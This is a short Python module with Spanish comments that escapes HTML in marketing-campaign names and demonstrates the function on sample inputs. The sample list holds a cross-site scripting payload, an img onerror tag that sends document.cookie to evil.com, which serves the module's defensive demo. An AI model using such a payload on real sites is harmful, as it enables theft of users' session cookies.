"""
3. XSS (Cross-Site Scripting)
------------------------------
sanitizar_nombre_campana escapa los caracteres HTML con html.escape antes de
persistir el nombre de una campaña. Los intentos con <script> o <img onerror>
quedan convertidos en texto inofensivo.
"""

import html
import logging

logger = logging.getLogger(__name__)

MAX_LEN_CAMPANA = 120


def sanitizar_nombre_campana(nombre: str) -> str:
    """
    Sanitiza el nombre de una campaña antes de almacenarlo.
    Escapa caracteres HTML y limita la longitud.
    """
    if len(nombre) > MAX_LEN_CAMPANA:
        logger.warning("Input too long - possible XSS payload, length: %d", len(nombre))
        raise ValueError(f"El nombre no puede superar {MAX_LEN_CAMPANA} caracteres.")

    sanitizado = html.escape(nombre, quote=True)

    if sanitizado != nombre:
        logger.warning("XSS attempt sanitized - original: %r", nombre)

    return sanitizado


def _demo_xss():
    print("\n--- 3. XSS (Cross-Site Scripting) --------------------------")
    casos = [
        'Verano 2026 - 2x puntos',
        '<script>alert("XSS")</script>',
        '<img src=x onerror=fetch("//evil.com/?c="+document.cookie)>',
    ]
    for caso in casos:
        try:
            resultado = sanitizar_nombre_campana(caso)
            estado = "[OK]       " if resultado == caso else "[SANITIZADO]"
            print(f"  {estado}  {resultado!r}")
        except ValueError as e:
            print(f"  [BLOQUEADO]  {e}")


if __name__ == "__main__":
    _demo_xss()
